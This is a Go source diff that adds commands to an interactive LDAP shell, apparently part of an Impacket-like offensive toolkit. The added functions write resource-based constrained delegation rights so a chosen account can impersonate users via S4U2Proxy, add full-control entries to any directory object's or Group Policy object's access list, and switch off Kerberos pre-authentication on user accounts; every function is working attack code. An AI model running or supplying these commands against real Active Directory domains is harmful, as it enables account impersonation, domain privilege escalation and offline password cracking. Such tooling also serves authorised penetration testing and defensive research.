@@ -481,3 +481,278 @@ func ldapShellEnableAccount(conn net.Conn, client *gopacketldap.Client, args []s
 	}
 	ldapShellToggleUAC(conn, client, baseDN, args[0], 0x2, false)
 }
+
+func ldapShellSetRBCD(conn net.Conn, client *gopacketldap.Client, args []string) {
+	if len(args) != 2 {
+		fmt.Fprintf(conn, "Usage: set_rbcd <target> <grantee>\n")
+		return
+	}
+	baseDN, err := client.GetDefaultNamingContext()
+	if err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+
+	targetName, granteeName := args[0], args[1]
+
+	// Resolve target
+	sr, err := client.Search(baseDN,
+		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(targetName)),
+		[]string{"objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity"})
+	if err != nil || len(sr.Entries) == 0 {
+		fmt.Fprintf(conn, "Error: target not found: %s\n", targetName)
+		return
+	}
+	target := sr.Entries[0]
+	targetSIDBytes := target.GetRawAttributeValue("objectSid")
+	targetSID, _, _ := security.ParseSIDBytes(targetSIDBytes)
+	fmt.Fprintf(conn, "Found Target DN: %s\n", target.DN)
+	fmt.Fprintf(conn, "Target SID: %s\n\n", targetSID.String())
+
+	// Resolve grantee
+	granteeSID, err := ldapShellResolveSID(client, baseDN, granteeName)
+	if err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+	granteeDN, _ := ldapShellResolveDN(client, baseDN, granteeName)
+	fmt.Fprintf(conn, "Found Grantee DN: %s\n", granteeDN)
+	fmt.Fprintf(conn, "Grantee SID: %s\n", granteeSID.String())
+
+	// Parse or create SD
+	existing := target.GetRawAttributeValue("msDS-AllowedToActOnBehalfOfOtherIdentity")
+	var sd *security.SecurityDescriptor
+	if len(existing) > 0 {
+		sd, err = security.ParseSecurityDescriptor(existing)
+		if err != nil {
+			sd = nil
+		}
+		if sd != nil {
+			fmt.Fprintf(conn, "Currently allowed sids:\n")
+			for _, ace := range sd.DACL.ACEs {
+				fmt.Fprintf(conn, "    %s\n", ace.SID.String())
+				if ace.SID.Equal(granteeSID) {
+					fmt.Fprintf(conn, "Grantee is already permitted to perform delegation to the target host\n")
+					return
+				}
+			}
+		}
+	}
+	if sd == nil {
+		sd = ldapShellBuildEmptySD()
+	}
+
+	sd.DACL.AddACE(&security.ACE{
+		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
+		Flags: 0,
+		Mask:  security.FULL_CONTROL,
+		SID:   granteeSID,
+	})
+
+	modReq := goldap.NewModifyRequest(target.DN, nil)
+	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd.Marshal())})
+	if err := client.Conn.Modify(modReq); err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+	fmt.Fprintf(conn, "Delegation rights modified successfully!\n")
+	fmt.Fprintf(conn, "%s can now impersonate users on %s via S4U2Proxy\n", granteeName, targetName)
+}
+
+func ldapShellClearRBCD(conn net.Conn, client *gopacketldap.Client, args []string) {
+	if len(args) == 0 {
+		fmt.Fprintf(conn, "Usage: clear_rbcd <target>\n")
+		return
+	}
+	baseDN, err := client.GetDefaultNamingContext()
+	if err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+	sr, err := client.Search(baseDN,
+		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(args[0])),
+		[]string{"objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity"})
+	if err != nil || len(sr.Entries) == 0 {
+		fmt.Fprintf(conn, "Error: target not found: %s\n", args[0])
+		return
+	}
+	target := sr.Entries[0]
+	targetSIDBytes := target.GetRawAttributeValue("objectSid")
+	targetSID, _, _ := security.ParseSIDBytes(targetSIDBytes)
+	fmt.Fprintf(conn, "Found Target DN: %s\n", target.DN)
+	fmt.Fprintf(conn, "Target SID: %s\n\n", targetSID.String())
+
+	sd := ldapShellBuildEmptySD()
+	modReq := goldap.NewModifyRequest(target.DN, nil)
+	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd.Marshal())})
+	if err := client.Conn.Modify(modReq); err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+	fmt.Fprintf(conn, "Delegation rights cleared successfully!\n")
+}
+
+func ldapShellGrantControl(conn net.Conn, client *gopacketldap.Client, args []string) {
+	if len(args) < 2 || len(args) > 3 {
+		fmt.Fprintf(conn, "Usage: grant_control [search_base] <target> <grantee>\n")
+		return
+	}
+	baseDN, err := client.GetDefaultNamingContext()
+	if err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+
+	var targetSpec, granteeName, targetBase string
+	if len(args) == 3 {
+		targetBase, targetSpec, granteeName = args[0], args[1], args[2]
+	} else {
+		targetBase = baseDN
+		targetSpec, granteeName = args[0], args[1]
+	}
+
+	// Resolve grantee SID
+	granteeSID, err := ldapShellResolveSID(client, baseDN, granteeName)
+	if err != nil {
+		fmt.Fprintf(conn, "Error: grantee not found: %v\n", err)
+		return
+	}
+	fmt.Fprintf(conn, "Resolved %q to %q\n", granteeName, granteeSID.String())
+
+	// Build target filter
+	var targetFilter string
+	if strings.HasPrefix(targetSpec, "(") && strings.HasSuffix(targetSpec, ")") {
+		targetFilter = targetSpec
+	} else {
+		targetFilter = fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(targetSpec))
+	}
+
+	// Search target with SD Flags control
+	sdControl := gopacketldap.NewControlMicrosoftSDFlags(0x04)
+	targetResult, err := client.SearchWithControls(targetBase, targetFilter,
+		[]string{"nTSecurityDescriptor"}, []goldap.Control{sdControl})
+	if err != nil || len(targetResult.Entries) == 0 {
+		fmt.Fprintf(conn, "Error: target not found\n")
+		return
+	}
+	if len(targetResult.Entries) > 1 {
+		fmt.Fprintf(conn, "Error: target not unique\n")
+		return
+	}
+	targetEntry := targetResult.Entries[0]
+	fmt.Fprintf(conn, "Resolved %q to %q\n", targetFilter, targetEntry.DN)
+
+	// Parse or create SD
+	sdData := targetEntry.GetRawAttributeValue("nTSecurityDescriptor")
+	var sd *security.SecurityDescriptor
+	if len(sdData) > 0 {
+		sd, err = security.ParseSecurityDescriptor(sdData)
+		if err != nil {
+			sd = nil
+		}
+	}
+	if sd == nil {
+		sd = ldapShellBuildEmptySD()
+	}
+
+	sd.DACL.AddACE(&security.ACE{
+		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
+		Flags: 0,
+		Mask:  security.FULL_CONTROL,
+		SID:   granteeSID,
+	})
+
+	sdControlWrite := gopacketldap.NewControlMicrosoftSDFlags(0x04)
+	modReq := goldap.NewModifyRequest(targetEntry.DN, []goldap.Control{sdControlWrite})
+	modReq.Replace("nTSecurityDescriptor", []string{string(sd.Marshal())})
+	if err := client.Conn.Modify(modReq); err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+	fmt.Fprintf(conn, "DACL modified successfully!\n")
+	fmt.Fprintf(conn, "%q now has control of %q\n", granteeName, targetEntry.DN)
+}
+
+func ldapShellWriteGPODacl(conn net.Conn, client *gopacketldap.Client, args []string) {
+	if len(args) != 2 {
+		fmt.Fprintf(conn, "Usage: write_gpo_dacl <user> <gpoSID>\n")
+		return
+	}
+	baseDN, err := client.GetDefaultNamingContext()
+	if err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+
+	userName, gpoSID := args[0], args[1]
+	fmt.Fprintf(conn, "Adding %s to GPO with GUID %s\n", userName, gpoSID)
+
+	// Resolve user SID
+	userSID, err := ldapShellResolveSID(client, baseDN, userName)
+	if err != nil {
+		fmt.Fprintf(conn, "Error: user not found: %v\n", err)
+		return
+	}
+
+	// Find GPO
+	sdControl := gopacketldap.NewControlMicrosoftSDFlags(0x04)
+	gpoResult, err := client.SearchWithControls(baseDN,
+		fmt.Sprintf("(&(objectclass=groupPolicyContainer)(name=%s))", goldap.EscapeFilter(gpoSID)),
+		[]string{"nTSecurityDescriptor"}, []goldap.Control{sdControl})
+	if err != nil || len(gpoResult.Entries) == 0 {
+		fmt.Fprintf(conn, "Error: GPO not found: %s\n", gpoSID)
+		return
+	}
+	gpo := gpoResult.Entries[0]
+
+	// Parse SD
+	sdData := gpo.GetRawAttributeValue("nTSecurityDescriptor")
+	var sd *security.SecurityDescriptor
+	if len(sdData) > 0 {
+		sd, err = security.ParseSecurityDescriptor(sdData)
+		if err != nil {
+			sd = nil
+		}
+	}
+	if sd == nil {
+		sd = ldapShellBuildEmptySD()
+	}
+
+	sd.DACL.AddACE(&security.ACE{
+		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
+		Flags: 0,
+		Mask:  security.FULL_CONTROL,
+		SID:   userSID,
+	})
+
+	sdControlWrite := gopacketldap.NewControlMicrosoftSDFlags(0x04)
+	modReq := goldap.NewModifyRequest(gpo.DN, []goldap.Control{sdControlWrite})
+	modReq.Replace("nTSecurityDescriptor", []string{string(sd.Marshal())})
+	if err := client.Conn.Modify(modReq); err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+	fmt.Fprintf(conn, "LDAP server claims to have taken the secdescriptor. Have fun\n")
+}
+
+func ldapShellSetDontReqPreauth(conn net.Conn, client *gopacketldap.Client, args []string) {
+	if len(args) != 2 {
+		fmt.Fprintf(conn, "Usage: set_dontreqpreauth <user> <true/false>\n")
+		return
+	}
+	baseDN, err := client.GetDefaultNamingContext()
+	if err != nil {
+		fmt.Fprintf(conn, "Error: %v\n", err)
+		return
+	}
+
+	flag := strings.ToLower(args[1])
+	switch flag {
+	case "true":
+		ldapShellToggleUAC(conn, client, baseDN, args[0], 0x400000, true)
+	case "false":
+		ldapShellToggleUAC(conn, client, baseDN, args[0], 0x400000, false)
+	default:
+		fmt.Fprintf(conn, "Error: flag must be true or false\n")
+	}
+}
